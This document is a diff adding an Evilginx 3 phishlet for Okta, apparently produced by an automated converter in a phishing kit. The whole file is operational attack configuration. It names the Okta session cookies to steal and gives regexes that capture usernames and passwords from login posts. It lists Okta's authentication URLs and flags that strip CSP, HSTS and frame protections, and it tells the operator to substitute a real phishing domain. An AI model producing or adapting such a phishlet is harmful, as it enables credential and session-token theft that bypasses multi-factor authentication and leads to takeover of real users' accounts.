@@ -1,0 +1,52 @@
+# =============================================================================
+# Evilginx 3 Phishlet — converted from okta.json
+# =============================================================================
+#
+# IMPORTANT: This is an automated conversion. Operator MUST review before use.
+#
+# Session cookies (Evilginx auto-detects these; listed for operator reference):
+#   - sid
+#   - DT
+#   - JSESSIONID
+#   - okta_session
+#   - tkn
+#
+# WARNING: The JSON phishlet did not define a hostname.
+#          A placeholder hostname "login.okta.example.com" was generated.
+#          You MUST update proxy_hosts[].phish_sub and sub_filters[].hostname
+#          to match your actual phishing domain before using this phishlet.
+#
+# JSON rewrite flags active: strip_csp, strip_xfo, strip_hsts, strip_cookie_secure, strip_cookie_domain, rewrite_location
+# Evilginx auto_filter handles some of these; verify after deployment.
+#
+
+name: okta
+author: "glnt-phish-kit"
+min_ver: "3.0.0"
+proxy_hosts:
+  - phish_sub: login
+    orig_sub: 
+    domain: okta.com
+    session: true
+    is_landing: true
+    auto_filter: true
+sub_filters:
+  - hostname: login.okta.example.com
+    sub: login
+    domain: okta.example.com
+    replace:
+      from: login.okta.example.com
+      to: okta.com
+auth_urls:
+  - https://okta.com/
+  - https://okta.com/login/
+  - https://okta.com/sso/
+  - https://okta.com/api/v1/authn
+  - https://okta.com/oauth2/
+  - https://okta.com/authorize
+  - https://okta.com/signin/
+landing_path: "/"
+user_re: "(?:identifier|username|login|email)=([^&]+)"
+pass_re: "(?:password|passwd|credentials\.passcode)=([^&]+)"
+force_post: false
+is_mfa: false
